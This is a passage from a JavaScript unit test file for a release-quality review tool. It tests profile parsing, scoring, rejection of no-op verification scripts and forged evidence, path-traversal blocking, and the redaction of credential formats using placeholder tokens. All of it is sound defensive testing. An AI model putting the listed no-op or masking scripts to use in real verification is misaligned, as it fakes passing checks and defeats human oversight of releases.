/**
 * Unit Tests for Release Quality Review Scripts
 *
 * Run with: node --test skills/release-quality-review/__tests__/unit.test.mjs
 *
 * Tests import production code from lib/review-utils.mjs - no simplified reimplementations.
 *
 * Tests:
 * 1. parseYamlProfile - YAML profile parsing (from production code)
 * 2. parseScore - Score extraction from markdown (from production code)
 * 3. detectChangeScale - Change scale detection (from production code)
 * 4. Phase persistence functions
 * 5. parseYamlResult - result.yaml parsing (from production code)
 */

import { chmodSync, copyFileSync, readFileSync, writeFileSync, mkdirSync, existsSync, rmSync, rmdirSync, symlinkSync, mkdtempSync, cpSync } from 'fs';
import { join } from 'path';
import { tmpdir, userInfo } from 'node:os';
import { fileURLToPath } from 'url';
import { spawnSync } from 'node:child_process';
import { createHash, randomUUID } from 'node:crypto';
import test from 'node:test';
import {
  parseScore,
  parseBlockers,
  parseYamlResult,
  detectChangeScale,
  parseYamlProfile,
  matchesTriggerConditions,
  findTrivialVerificationScripts,
  hasConcreteVerificationOutput,
  CLEAN_CANDIDATE_COMMANDS,
  ROLLBACK_COMMANDS,
  validateCleanCandidateEvidence,
  validateRollbackEvidence,
  validateResultYamlContract,
  strictAutomatedChecksPassed,
} from '../lib/review-utils.mjs';
import {
  resolveWithinRoot,
  isRealDirectory,
  shouldIncludeCanonicalFile,
  containsSensitiveText,
  createCandidateSubprocessEnv,
  createSubprocessEnv,
  redactSensitiveText,
  wrapCandidateCommand,
  readContainedFileSync,
  writeContainedFileSync,
  writeContainedFile,
} from '../lib/security-utils.mjs';
import { persistPhasePlan, persistPhaseResult } from '../lib/phase-persistence.mjs';
import { checkMissingEvidenceOutput, extractCommandEvidence, extractTestOutputs } from '../lib/evidence-utils.mjs';
import { detectChangeScale as detectGateChangeScale, printScaleDetection } from '../scripts/modules/scale.mjs';
import { printHelp as printGateHelp } from '../scripts/modules/cli.mjs';
import { collectEvidence, prepareTrustedAuditWorkspace, runAutomatedChecks, runEvidenceCommand } from '../scripts/modules/evidence.mjs';
import { createCandidateRuntime } from '../lib/candidate-runtime.mjs';

const __dirname = fileURLToPath(new URL('.', import.meta.url));
const SKILL_DIR = join(__dirname, '..');
const PROJECT_ROOT = join(SKILL_DIR, '..', '..');
const TEST_ROOT = join(tmpdir(), 'release-quality-review-tests');
const TEST_DIR = join(TEST_ROOT, `${process.pid}-${randomUUID()}`);
const ROUND_BASE = process.pid * 10;
const TEST_ROUNDS = {
  veto: ROUND_BASE + 1,
  runner: ROUND_BASE + 2,
  rehydrate: ROUND_BASE + 3,
  missingEvidence: ROUND_BASE + 4,
  parallelTimeout: ROUND_BASE + 5,
  parallelSuccess: ROUND_BASE + 6,
  evidenceForgery: ROUND_BASE + 7,
};
const reportRound = round => join(PROJECT_ROOT, 'quality-reports', `round-${String(round).padStart(3, '0')}`);

// Create test directory at module load time
mkdirSync(TEST_DIR, { recursive: true });

// ============================================================================
// Test Utilities
// ============================================================================

function createMockFs(profileName, content) {
  const mockFile = join(TEST_DIR, `${profileName}.yaml`);
  writeFileSync(mockFile, content);
  return mockFile;
}

function assertEqual(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message}: expected ${expected}, got ${actual}`);
  }
}

function assertTrue(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

// ============================================================================
// TESTS - parseYamlProfile (imported from production)
// ============================================================================

test.describe('parseYamlProfile (production)', () => {
  test('loads required adversarial reviewers from the real agentic profile', () => {
    const content = readFileSync(join(SKILL_DIR, 'profiles', 'agentic-release-gate.yaml'), 'utf-8');
    const profile = parseYamlProfile(content, 'agentic-release-gate');
    assertEqual(profile.gate.require_adversarial, true);
    assertEqual(profile.adversarial_reviewers.length, 4);
  });
  test('parses basic profile correctly', () => {
    const content = `
profile: test-profile
description: Test description
estimated_time: ~10 minutes

resident_reviewers:
  - product-flow
  - architecture-maintainer

gate:
  min_score: 90
  fail_on_redlines: true
`;
    const mockPath = createMockFs('test-basic', content);
    const profile = parseYamlProfile(readFileSync(mockPath, 'utf-8'), 'test-profile');

    assertEqual(profile.name, 'test-profile');
    assertTrue(profile.resident_reviewers.includes('product-flow'), 'Should contain product-flow');
    assertTrue(profile.resident_reviewers.includes('architecture-maintainer'), 'Should contain architecture-maintainer');
    assertEqual(profile.gate.min_score, 90);
    assertEqual(profile.gate.fail_on_redlines, true);
  });

  test('handles empty resident_reviewers', () => {
    const content = `
profile: empty-test
description: Test empty array
resident_reviewers: []
`;
    const mockPath = createMockFs('test-empty', content);
    const profile = parseYamlProfile(readFileSync(mockPath, 'utf-8'), 'empty-test');
    assertEqual(JSON.stringify(profile.resident_reviewers), '[]');
  });

  test('skips markdown checkboxes', () => {
    const content = `
profile: checkbox-test

## Checklist
- [x] Done item
- [ ] Pending item

resident_reviewers:
  - product-flow
`;
    const mockPath = createMockFs('test-checkbox', content);
    const profile = parseYamlProfile(readFileSync(mockPath, 'utf-8'), 'checkbox-test');
    assertTrue(profile.resident_reviewers.includes('product-flow'), 'Should contain product-flow');
    assertEqual(profile.resident_reviewers.length, 1);
  });
});

test.describe('verification script integrity', () => {
  test('rejects explicit success no-ops and accepts meaningful nested scripts', () => {
    const commands = ['npm test', 'npm run coverage', 'npm run lint', 'npm run build'];
    const forged = {
      test: 'true', coverage: 'echo 100%', lint: 'exit 0', build: 'node -e "process.exit(0)"',
    };
    assertEqual(findTrivialVerificationScripts(forged, commands).length, 4);
    const real = {
      test: 'node --test test.mjs', coverage: 'node --test --experimental-test-coverage test.mjs',
      typecheck: 'node --check app.mjs', lint: 'npm run typecheck', build: 'npm run typecheck',
    };
    assertEqual(findTrivialVerificationScripts(real, commands).length, 0);
  });

  test('rejects verifier text hidden behind a successful OR branch', () => {
    const scripts = {
      test: 'true || npm run unit',
      coverage: 'echo 100% || npm run unit',
      lint: 'node -e "process.exit(0)" || npm run unit',
      build: 'exit 0 || npm run unit',
      unit: 'node --test test.mjs',
    };
    const commands = ['npm test', 'npm run coverage', 'npm run lint', 'npm run build'];
    assertEqual(findTrivialVerificationScripts(scripts, commands).length, 4);
  });

  test('rejects equivalent wrappers and requires concrete test output', () => {
    const scripts = {
      test: 'sh -c true', coverage: 'command true', lint: 'node -e "0"', build: 'node -e "process.exitCode=0"',
    };
    const commands = ['npm test', 'npm run coverage', 'npm run lint', 'npm run build'];
    assertEqual(findTrivialVerificationScripts(scripts, commands).length, 4);
    assertEqual(hasConcreteVerificationOutput('test', '# tests 0\n# fail 0'), false);
    assertEqual(hasConcreteVerificationOutput('test', '# tests 76\n# fail 0'), true);
    assertEqual(hasConcreteVerificationOutput('coverage', 'command exited 0'), false);
    assertEqual(hasConcreteVerificationOutput('coverage', '# start of coverage report'), true);
  });

  test('rejects unknown success wrappers by allowlisting verification tools', () => {
    const scripts = {
      test: 'env true', coverage: 'command sh -c true', lint: 'bash -lc true', build: 'exec true',
    };
    const commands = ['npm test', 'npm run coverage', 'npm run lint', 'npm run build'];
    assertEqual(findTrivialVerificationScripts(scripts, commands).length, 4);
  });

  test('rejects shell operators that can mask verifier failure and contradictory summaries', () => {
    const scripts = {
      test: 'node --test test.mjs || true',
      coverage: 'node --experimental-test-coverage --test test.mjs | cat',
      lint: 'node --check app.mjs; true',
      build: 'node --check app.mjs & true',
    };
    assertEqual(findTrivialVerificationScripts(
      scripts, ['npm test', 'npm run coverage', 'npm run lint', 'npm run build']
    ).length, 4);
    assertEqual(hasConcreteVerificationOutput('test', '# tests 1\n# fail 0\n# tests 1\n# fail 1'), false);
    assertEqual(hasConcreteVerificationOutput('test', '# tests 1\n# fail 0\n# tests 2\n# fail 0'), true);
  });

  test('rejects arbitrary Node programs, inline evaluation, and mismatched runner capabilities', () => {
    const commands = ['npm test', 'npm run coverage', 'npm run typecheck', 'npm run lint', 'npm run build'];
    for (const nodeCommand of [
      'node fake-verifier.mjs', 'node /dev/null', 'node --eval="0"', 'node -e0',
      'node --print="0"', 'node -p0', 'node --input-type=module -e 0',
      'node fake-verifier.mjs --test',
      'node fake-verifier.mjs --test --experimental-test-coverage',
      'node --eval="0" --test --experimental-test-coverage',
      'node -p0 --test --experimental-test-coverage',
    ]) {
      const scripts = Object.fromEntries(['test', 'coverage', 'typecheck', 'lint', 'build']
        .map(name => [name, nodeCommand]));
      assertEqual(findTrivialVerificationScripts(scripts, commands).length, 5, nodeCommand);
    }

    assertEqual(findTrivialVerificationScripts({
      test: 'node --check app.mjs',
      coverage: 'node --test test.mjs',
    }, ['npm test', 'npm run coverage']).length, 2);
  });
});

// ============================================================================
// TESTS - parseScore (imported from production)
// ============================================================================

test.describe('parseScore (production)', () => {
  test('extracts score from "Overall Score: **XX/100**"', () => {
    const content = '## Overall Score: **85/100**';
    assertEqual(parseScore(content), 85);
  });

  test('extracts score from "Overall Score: XX"', () => {
    const content = '## Overall Score: 92';
    assertEqual(parseScore(content), 92);
  });

  test('extracts score with Chinese "总分" + slash format', () => {
    const content = '总分: 78/100';
    assertEqual(parseScore(content), 78);
  });

  test('extracts score with spaces around slash', () => {
    const content = 'Score: 88 / 100';
    assertEqual(parseScore(content), 88);
  });

  test('returns null for invalid input', () => {
    assertEqual(parseScore(null), null);
    assertEqual(parseScore(undefined), null);
    assertEqual(parseScore(''), null);
    assertEqual(parseScore('No score here'), null);
  });

  test('returns null for out-of-range score', () => {
    assertEqual(parseScore('Score: 150'), null);
    assertEqual(parseScore('Score: -5'), null);
  });
});

// ============================================================================
// TESTS - detectChangeScale (imported from production)
// ============================================================================

test.describe('detectChangeScale (production)', () => {
  test('returns micro for 1-2 files with very few lines', () => {
    const scale = detectChangeScale(['file1.ts'], 20, 20);
    assertEqual(scale.scale, 'micro');
    assertEqual(scale.files, 1);
  });

  test('returns small for 3-5 files or 50+ lines', () => {
    const scale = detectChangeScale(['f1.ts', 'f2.ts', 'f3.ts', 'f4.ts'], 30, 30);
    assertEqual(scale.scale, 'small');
    assertEqual(scale.files, 4);
  });

  test('returns medium for 6-20 files or 100+ lines', () => {
    const files = Array(10).fill('file.ts');
    const scale = detectChangeScale(files, 50, 50);
    assertEqual(scale.scale, 'medium');
    assertEqual(scale.files, 10);
  });

  test('returns large for 21-50 files or 500+ lines', () => {
    const files = Array(30).fill('file.ts');
    const scale = detectChangeScale(files, 300, 200);
    assertEqual(scale.scale, 'large');
    assertEqual(scale.files, 30);
  });

  test('returns xlarge for 50+ files', () => {
    const files = Array(60).fill('file.ts');
    const scale = detectChangeScale(files, 1500, 1500);
    assertEqual(scale.scale, 'xlarge');
    assertEqual(scale.files, 60);
  });

  test('considers lines for scale determination (OR logic)', () => {
    // Few files but many lines → upgraded by line count (OR logic)
    const scale = detectChangeScale(['f1.ts', 'f2.ts'], 2000, 500);
    assertEqual(scale.scale, 'xlarge');
  });

  test('handles no changes gracefully', () => {
    const scale = detectChangeScale([], 0, 0);
    assertEqual(scale.scale, 'none');
    assertEqual(scale.files, 0);
  });
});

test.describe('gate change-scale module', () => {
  test('detects the current repository and fails closed for an invalid root', () => {
    const detected = detectGateChangeScale(PROJECT_ROOT, 'HEAD');
    assertTrue(['micro', 'small', 'medium', 'large', 'xlarge'].includes(detected.scale), 'Expected a known scale');
    assertTrue(detected.files >= 0 && detected.total >= 0, 'Expected non-negative change counts');

    const fallback = detectGateChangeScale(join(TEST_DIR, 'missing-repository'), 'HEAD');
    assertEqual(fallback.scale, 'unknown');
    assertEqual(fallback.suggestedProfile, 'release-gate');
  });

  test('prints the detected scale and explicit profile override', () => {
    const output = [];
    const originalLog = console.log;
    console.log = value => output.push(String(value ?? ''));
    try {
      printScaleDetection({
        scale: 'xlarge',
        files: 50,
        additions: 2000,
        deletions: 1,
        total: 2001,
        suggestedProfile: 'agentic-release-gate',
        reason: 'test fixture',
        requiresAgentic: true,
      }, true, 'full');
    } finally {
      console.log = originalLog;
    }
    assertTrue(output.some(line => line.includes('XLarge change')), 'Expected agentic recommendation');
    assertTrue(output.some(line => line.includes('User Override: Using --profile full')), 'Expected profile override');
  });
});

test.describe('gate CLI and filesystem helpers', () => {
  test('distinguishes real directories from files and missing paths', () => {
    const directory = join(TEST_DIR, 'real-directory');
    const file = join(TEST_DIR, 'regular-file');
    mkdirSync(directory);
    writeFileSync(file, 'fixture');
    assertEqual(isRealDirectory(directory), true);
    assertEqual(isRealDirectory(file), false);
    assertEqual(isRealDirectory(join(TEST_DIR, 'missing')), false);
  });

  test('prints gate usage including automatic round behavior', () => {
    const output = [];
    const originalLog = console.log;
    console.log = value => output.push(String(value ?? ''));
    try {
      printGateHelp();
    } finally {
      console.log = originalLog;
    }
    assertTrue(output.some(line => line.includes('auto-detected if not specified')), 'Expected automatic round help');
  });
});

// ============================================================================
// TESTS - parseYamlResult (imported from production)
// ============================================================================

test.describe('parseYamlResult (production)', () => {
  test('parses the canonical nested result template without throwing', () => {
    const content = readFileSync(join(SKILL_DIR, 'templates', 'result.yaml'), 'utf-8');
    const result = parseYamlResult(content);
    assertTrue(Array.isArray(result.blockers), 'blockers should be an array');
    assertTrue(Array.isArray(result.redlines), 'redlines should be an array');
    assertEqual(result.status, 'pass|fail');
    assertTrue(result.redlines.length > 0, 'canonical redline should be retained');
  });
  test('parses inline blocker format', () => {
    const content = `reviewer: destructive-qa
score: 85/100
status: fail
blockers:
  - P0: Critical security vulnerability
  - P1: Missing error handling
`;
    const result = parseYamlResult(content);
    assertEqual(result.reviewer, 'destructive-qa');
    assertEqual(result.score, 85);
    assertEqual(result.status, 'fail');
    assertEqual(result.blockers.length, 2);
    assertEqual(result.blockers[0].priority, 'P0');
    assertEqual(result.blockers[1].priority, 'P1');
  });

  test('parses nested severity blocker format', () => {
    const content = `reviewer: destructive-qa
score: 72/100
status: fail
blockers:
  - priority: P0
    description: Cross-site scripting in user input
  - severity: P1
    description: Missing rate limiting
`;
    const result = parseYamlResult(content);
    assertEqual(result.score, 72);
    assertEqual(result.blockers.length, 2);
    // Nested format should produce objects with priority/severity fields
    assertTrue(typeof result.blockers[0] === 'object', 'First blocker should be object');
    assertTrue(
      result.blockers[0].priority === 'P0' || result.blockers[0].severity === 'P1',
      'Should have priority or severity'
    );
  });

  test('parses redlines separately from blockers', () => {
    const content = `reviewer: release-verifier
score: 45/100
status: fail
blockers:
  - P1: Missing test coverage
redlines:
  - P0: Build is broken
  - P0: TypeScript errors in core
`;
    const result = parseYamlResult(content);
    assertEqual(result.blockers.length, 1);
    assertEqual(result.redlines.length, 2);
    assertEqual(result.redlines[0].priority, 'P0');
  });

  test('parses dimensions', () => {
    const content = `reviewer: product-flow
score: 92/100
status: pass
dimensions:
  product-closure: 45/50
  edge-case-handling: 47/50
`;
    const result = parseYamlResult(content);
    assertEqual(Object.keys(result.dimensions).length, 2);
    assertEqual(result.dimensions['product-closure'].score, 45);
    assertEqual(result.dimensions['edge-case-handling'].score, 47);
  });
});

test.describe('result.yaml machine contract', () => {
  const canonical = `reviewer: product-flow
profile: agentic-release-gate
round: 77
candidate_commit: 1111111111111111111111111111111111111111
candidate_tree: 2222222222222222222222222222222222222222
score: 95
status: pass
blockers: []
`;
  test('accepts required scalar fields plus optional packet fields', () => {
    assertEqual(validateResultYamlContract(canonical).valid, true);
  });
  test('rejects duplicate, slash-form, nested, and non-lowercase machine fields', () => {
    for (const invalid of [
      `${canonical}score: 96\n`,
      canonical.replace('score: 95', 'score: 95/100'),
      canonical.replace('score: 95', 'score:\n  total: 95'),
      canonical.replace('status: pass', 'status: PASS'),
    ]) assertEqual(validateResultYamlContract(invalid).valid, false);
  });
  test('rejects reordered required fields and unknown top-level fields', () => {
    const reversed = canonical.split('\n').slice(0, 7).reverse().join('\n');
    assertEqual(validateResultYamlContract(`${reversed}\n`).valid, false);
    assertEqual(validateResultYamlContract(canonical.replace('profile:', 'unexpected_authority: trusted\nprofile:')).valid, false);
  });
});

test('strict automated checks reject failed coverage', () => {
  const pass = { status: 'pass' };
  const checks = {
    testGate: pass, typecheckGate: pass, buildGate: pass, lintGate: pass, auditGate: pass,
    coverageGate: { status: 'fail' }, e2eGate: pass, secrets: pass, circularDeps: pass,
  };
  assertEqual(strictAutomatedChecksPassed(checks, true), false);
  checks.coverageGate = pass;
  assertEqual(strictAutomatedChecksPassed(checks, true), true);
});

// ============================================================================
// TESTS - persistPhasePlan
// ============================================================================

test.describe('persistPhasePlan', () => {
  test('creates plan file with correct structure', () => {
    const roundDir = join(TEST_DIR, 'plan-test');
    const planFile = persistPhasePlan(roundDir, 1, ['product-flow', 'destructive-qa'], {
      git: { changedFiles: ['a.ts', 'b.ts'], branch: 'main', commit: 'abc123' },
      scale: { scale: 'small', fileCount: 2, totalLines: 100 }
    }, { name: 'test', gate: { min_score: 90 } });

    assertTrue(existsSync(planFile), 'Plan file should exist');
    const content = readFileSync(planFile, 'utf-8');
    assertTrue(content.includes('# Phase 1 Plan'), 'Should contain Phase 1 Plan header');
    assertTrue(content.includes('product-flow'), 'Should list product-flow reviewer');
    assertTrue(content.includes('small'), 'Should include scale info');
    assertTrue(content.includes('2 files, 100 lines'), 'Should include production scale counts');
  });
});

// ============================================================================
// TESTS - persistPhaseResult
// ============================================================================

test.describe('persistPhaseResult', () => {
  test('creates result file with scores', () => {
    const roundDir = join(TEST_DIR, 'result-test');
    const resultFile = persistPhaseResult(roundDir, 1, { 'product-flow': 95, 'destructive-qa': 88 }, false, [{ reviewer: 'destructive-qa', score: 88 }]);

    assertTrue(existsSync(resultFile), 'Result file should exist');
    const content = readFileSync(resultFile, 'utf-8');
    assertTrue(content.includes('# Phase 1 Result'), 'Should contain Phase 1 Result header');
    assertTrue(content.includes('product-flow'), 'Should list reviewer');
    assertTrue(content.includes('GATES FAILED'), 'Should show FAILED status');
  });

  test('shows PASSED status when gate passes', () => {
    const roundDir = join(TEST_DIR, 'result-pass');
    const resultFile = persistPhaseResult(roundDir, 1, { 'product-flow': 95 }, true, []);
    const content = readFileSync(resultFile, 'utf-8');
    assertTrue(content.includes('ALL GATES PASSED'), 'Should show PASSED status');
  });

  test('lists failed reviewers', () => {
    const roundDir = join(TEST_DIR, 'result-fail');
    const resultFile = persistPhaseResult(roundDir, 1, { 'product-flow': 95, 'destructive-qa': 75 }, false, [{ reviewer: 'destructive-qa', score: 75 }]);
    const content = readFileSync(resultFile, 'utf-8');
    assertTrue(content.includes('destructive-qa'), 'Should list failed reviewer');
    assertTrue(content.includes('75/100'), 'Should show score');
  });
});

// ============================================================================
// TESTS - Adversarial Review Detection
// ============================================================================

test.describe('adversarial review detection', () => {
  test('keeps canonical evidence policy aligned with the production validator', () => {
    const validator = readFileSync(join(SKILL_DIR, 'scripts', 'evidence-validator.mjs'), 'utf8');
    const policyFiles = [
      'rubrics/evidence.md',
      'rubrics/five-principles.md',
      'reviewers/adversarial-completion.md',
      'reviewers/principles-compliance.md',
      'reviewers/TEMPLATE.md',
    ].map(file => readFileSync(join(SKILL_DIR, file), 'utf8')).join('\n');
    assertEqual(validator.includes('checkDiffFileReferences'), false,
      'Production validator must not retain a contradictory dead diff-citation rule');
    assertTrue(policyFiles.includes('独立 Reviewer 可以引用候选 diff'),
      'Canonical policy must explicitly allow independent candidate-diff inspection');
    assertEqual(policyFiles.includes('引用 diff 中新增代码: -10'), false,
      'Canonical policy must not penalize candidate-diff citations by themselves');
    assertEqual(policyFiles.includes('自我验证: 引用 diff 新增代码'), false,
      'Canonical redlines must target self-authorship rather than candidate inspection');
  });

  function detectSelfReference(content) {
    const patterns = [
      { pattern: /我们添加|我们修改|我们实现/g, desc: '使用"我们"' },
      { pattern: /我写的|我添加的|我实现的/g, desc: '使用"我"' },
      { pattern: /上面的代码|刚才的|刚才实现/g, desc: '引用刚写的代码' },
      { pattern: /按照上述|根据上面|依据上文/g, desc: '引用实现过程' },
    ];

    const violations = [];
    for (const { pattern, desc } of patterns) {
      const matches = content.match(pattern);
      if (matches) {
        violations.push({ type: 'self_reference', desc, count: matches.length });
      }
    }
    return violations;
  }

  test('detects "我们添加" self-reference', () => {
    const content = '我们添加了这个测试来验证功能';
    const violations = detectSelfReference(content);
    assertEqual(violations.length, 1);
    assertEqual(violations[0].desc, '使用"我们"');
  });

  test('detects "我写的" self-reference', () => {
    const content = '这是我写的代码，它工作正常';
    const violations = detectSelfReference(content);
    assertEqual(violations.length, 1);
    assertEqual(violations[0].desc, '使用"我"');
  });

  test('detects "上面的代码" reference', () => {
    const content = '按照上面的代码实现，这个功能正确';
    const violations = detectSelfReference(content);
    assertTrue(violations.length >= 1, `Expected >= 1 violations, got ${violations.length}`);
    const hasRelevantViolation = violations.some(v =>
      v.desc === '引用刚写的代码' || v.desc === '引用实现过程'
    );
    assertTrue(hasRelevantViolation, 'Should detect reference to implementation');
  });

  test('detects multiple self-reference patterns', () => {
    const content = '我们添加了测试，我写的代码按照上面的实现';
    const violations = detectSelfReference(content);
    assertTrue(violations.length >= 2, `Expected >= 2 violations, got ${violations.length}`);
  });

  test('allows valid evidence sources', () => {
    const content = 'apps/local-server/src/existing-file.ts:45 - 有正确的错误处理\npnpm test 输出: 10 passed';
    const violations = detectSelfReference(content);
    assertEqual(violations.length, 0);
  });

  test('detects missing test output when claiming pass', () => {
    const content = '测试通过，功能正常';
    const violations = checkMissingEvidenceOutput(content);
    assertEqual(violations.length, 2);
    assertEqual(violations[0].need, 'npm test 的 exit 0 与输出摘要');
  });

  test('allows valid test output citation', () => {
    const content = 'pnpm test exited 0; output: 10 passed\n所有测试通过';
    const violations = checkMissingEvidenceOutput(content);
    assertEqual(violations.length, 0);
  });

  test('rejects a bare command token and static references as runtime evidence', () => {
    const content = '功能正常。运行证据：npm test。\na.mjs:1\nb.mjs:1\nc.mjs:1\nd.mjs:1\ne.mjs:1';
    assertEqual(extractCommandEvidence(content).length, 0);
    assertEqual(checkMissingEvidenceOutput(content).length, 1);
  });

  test('rejects unverified evidence markers and score ratios as runtime evidence', () => {
    const content = '测试通过。运行证据：npm test exit 0 metadata.json。';
    assertEqual(extractCommandEvidence(content).length, 0);
    assertEqual(checkMissingEvidenceOutput(content).length, 1);
    assertEqual(extractTestOutputs('## Overall Score: 95/100').length, 0);
  });

  test('detects missing build output when claiming success', () => {
    const content = '构建成功，代码可以发布';
    const violations = checkMissingEvidenceOutput(content);
    assertEqual(violations.length, 1);
    assertEqual(violations[0].need, 'build 的 exit 0 与输出摘要');
  });
});

test.describe('security boundaries', () => {
  test('rejects paths that escape the repository', () => {
    let rejected = false;
    try {
      resolveWithinRoot('/tmp/repository', '../escaped.md', 'adapter');
    } catch {
      rejected = true;
    }
    assertTrue(rejected, 'Expected path traversal to be rejected');
    let absoluteRejected = false;
    try {
      resolveWithinRoot('/tmp/repository', '/tmp/absolute.md', 'adapter');
    } catch {
      absoluteRejected = true;
    }
    assertTrue(absoluteRejected, 'Expected absolute paths to be rejected');
  });

  test('accepts paths contained by the repository', () => {
    assertEqual(
      resolveWithinRoot('/tmp/repository', '.claude/agents/reviewer.md', 'adapter'),
      '/tmp/repository/.claude/agents/reviewer.md'
    );
  });

  test('excludes platform metadata from canonical hashes', () => {
    assertEqual(shouldIncludeCanonicalFile('.DS_Store'), false);
    assertEqual(shouldIncludeCanonicalFile('SKILL.md'), true);
  });

  test('redacts common credential formats', () => {
    const input = [
      'Authorization: Bearer provider-token',
      '{"token":"json-token"}',
      'https://user:password@example.com/path',
      'Cookie: session=secret-value',
      '-----BEGIN RSA PRIVATE KEY-----\nabc123\n-----END RSA PRIVATE KEY-----',
    ].join('\n');
    const redacted = redactSensitiveText(input);
    for (const secret of ['provider-token', 'json-token', 'user:password', 'secret-value', 'abc123']) {
      assertEqual(redacted.includes(secret), false, `Expected ${secret} to be redacted`);
    }
  });

  test('redacts standalone provider tokens and JWT-shaped values', () => {
    const secrets = [
      'ghp_abcdefghijklmnopqrstuvwxyz1234567890',
      'github_pat_abcdefghijklmnopqrstuvwxyz1234567890',
      'glpat-abcdefghijklmnopqrstuvwxyz1234567890',
      'npm_abcdefghijklmnopqrstuvwxyz1234567890',
      'slack-token-test-placeholder-abcdefghijklmnopqrstuvwxyz',
      'AIzaabcdefghijklmnopqrstuvwxyz1234567890',
      'sk_live_abcdefghijklmnopqrstuvwxyz1234567890',
      'sk-proj-abcdefghijklmnopqrstuvwxyz1234567890',
      'AKIAIOSFODNN7EXAMPLE',
      'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signaturevalue',
      'Bearer standalone-provider-token',
    ];
    const redacted = redactSensitiveText(secrets.join('\n'));
    for (const secret of secrets) {
      assertEqual(containsSensitiveText(secret), true, `Expected ${secret} to be detected`);
      assertEqual(redacted.includes(secret), false, `Expected ${secret} to be redacted`);
    }
  });

  test('builds a least-privilege subprocess environment', () => {
    const env = createSubprocessEnv({
      PATH: '/usr/bin', HOME: '/tmp/home', LANG: 'en_US.UTF-8', NODE_TEST_CONTEXT: 'child-v8',
      OPENAI_API_KEY: ['sk', 'proj-abcdefghijklmnopqrstuvwxyz'].join('-'),
      AMBIENT_SECRET_CANARY: 'must-not-cross',
    });
    assertEqual(env.PATH, '/usr/bin');
    assertEqual(env.HOME, '/tmp/home');
    assertEqual(env.LANG, 'en_US.UTF-8');
    assertEqual(env.NODE_TEST_CONTEXT, 'child-v8');
    assertEqual(env.OPENAI_API_KEY, undefined);
    assertEqual(env.AMBIENT_SECRET_CANARY, undefined);
    const candidateEnv = createCandidateSubprocessEnv({
      PATH: '/usr/bin', HOME: '/real-home', CODEX_HOME: '/real-codex', OPENAI_API_KEY: 'hidden',
    }, '/isolated-home');
    assertEqual(candidateEnv.PATH, '/usr/bin');
    assertEqual(candidateEnv.HOME, '/isolated-home');
    assertEqual(candidateEnv.TMPDIR, '/isolated-home');
    assertEqual(candidateEnv.CODEX_HOME, undefined);
    assertEqual(candidateEnv.OPENAI_API_KEY, undefined);
  });

  test('detects quoted and unquoted generic secret assignments', () => {
    for (const value of [
      'password=correct-horse-battery-staple',
      'token=plain-secret-value',
      'api_key=plain-secret-value',
      'CUSTOM_API_KEY=abcdefghijklmnopqrstuvwxyz123456',
    ]) assertEqual(containsSensitiveText(value), true, `Expected sensitive assignment: ${value.split('=')[0]}`);
  });

  test('rejects forged clean-candidate command and tree evidence', () => {
    const now = new Date().toISOString();
    const clean = {
      schema_version: 1, candidate_commit: 'commit', candidate_tree: 'tree',
      isolated_commit: 'commit', isolated_tree: 'tree', source_status: '', final_source_status: '',
      isolated_checkout: true, status: 'pass', exit_code: 0,
      commands: CLEAN_CANDIDATE_COMMANDS.map(([id, command]) => {
        const output = id === 'test' ? '# tests 1\n# fail 0\n'
          : id === 'coverage' ? '# start of coverage report\n' : '';
        return {
          id, command, started_at: now, finished_at: now, exit_code: 0, status: 'pass',
          output, output_bytes: Buffer.byteLength(output), truncated: false,
        };
      }),
    };
    assertEqual(validateCleanCandidateEvidence(clean, 'commit', 'tree'), true);
    assertEqual(validateCleanCandidateEvidence({ ...clean, candidate_tree: 'forged' }, 'commit', 'tree'), false);
    const forgedCommands = structuredClone(clean);
    forgedCommands.commands = [{ id: 'forged', command: 'forged', exit_code: 0, status: 'pass' }];
    assertEqual(validateCleanCandidateEvidence(forgedCommands, 'commit', 'tree'), false);
    const substitutedCommand = structuredClone(clean);
    substitutedCommand.commands[2].command = 'printf [REDACTED]';
    assertEqual(validateCleanCandidateEvidence(substitutedCommand, 'commit', 'tree'), false);
  });

  test('validates structured rollback evidence and rejects forged trees', () => {
    const now = new Date().toISOString();
    const outputs = ['', '', 'candidate', 'candidate-tree', '', 'base-tree', '10.33.0', '', '# tests 0\n# pass 0\n', ''];
    const rollback = {
      schema_version: 1,
      candidate_commit: 'candidate',
      candidate_tree: 'candidate-tree',
      base_commit: 'base',
      base_tree: 'base-tree',
      isolated_commit: 'candidate',
      isolated_tree: 'candidate-tree',
      rollback_tree: 'base-tree',
      source_status: '',
      final_source_status: '',
      isolated_checkout: true,
      status: 'pass',
      exit_code: 0,
      commands: ROLLBACK_COMMANDS.map(([id, command], index) => ({
        id,
        command,
        started_at: now,
        finished_at: now,
        exit_code: 0,
        status: 'pass',
        output: outputs[index],
        output_bytes: Buffer.byteLength(outputs[index]),
        truncated: false,
      })),
    };
    assertEqual(validateRollbackEvidence(rollback, 'candidate', 'candidate-tree', 'base', 'base-tree'), true);
    assertEqual(validateRollbackEvidence({ ...rollback, rollback_tree: 'forged' }, 'candidate', 'candidate-tree', 'base', 'base-tree'), false);
    const missingTranscript = structuredClone(rollback);
    missingTranscript.commands[8].output = '';
    missingTranscript.commands[8].output_bytes = 0;
    assertEqual(validateRollbackEvidence(missingTranscript, 'candidate', 'candidate-tree', 'base', 'base-tree'), false);
  });

  test('filesystem sandbox denies the host home outside allowed roots', { skip: process.platform !== 'darwin' }, t => {
    const probe = spawnSync('/usr/bin/sandbox-exec', [
      '-p', '(version 1) (allow default)', '/usr/bin/true',
    ], { encoding: 'utf8' });
    if (probe.status !== 0 && /sandbox_apply:\s*Operation not permitted/i.test(`${probe.stdout}${probe.stderr}`)) {
      const original = process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED;
      delete process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED;
      let rejected = false;
      try {
        wrapCandidateCommand(process.execPath, ['-e', ''], { allowedRoots: [PROJECT_ROOT] });
      } catch (error) {
        rejected = error.message.includes('explicit outer-sandbox attestation required');
      }
      assertEqual(rejected, true, 'Unavailable nested sandbox must fail closed');
      process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED = '1';
      const attested = wrapCandidateCommand(process.execPath, ['-e', ''], { allowedRoots: [PROJECT_ROOT] });
      assertEqual(attested.command, process.execPath, 'Explicit outer sandbox attestation should permit host enforcement');
      if (original === undefined) delete process.env.RELEASE_QUALITY_OUTER_SANDBOX_ATTESTED;
